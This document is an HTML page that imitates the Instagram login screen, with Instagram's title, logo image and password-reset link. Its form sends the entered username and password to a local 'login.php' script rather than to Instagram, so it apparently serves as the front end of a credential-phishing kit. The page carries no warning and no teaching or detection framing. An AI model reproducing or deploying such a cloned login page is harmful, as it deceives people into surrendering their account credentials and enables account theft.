<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      width: 350px;
      padding: 40px;
      background: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }
    .logo {
      width: 175px;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      margin: 8px 0;
      padding: 10px;
      border: 1px solid #dbdbdb;
      background: #fafafa;
      border-radius: 3px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      margin-top: 10px;
      border-radius: 4px;
      cursor: pointer;
    }
    .forgot {
      margin-top: 10px;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram">
    <form method="POST" action="login.php">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="forgot">
      <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
    </div>
  </div>
</body>
</html>
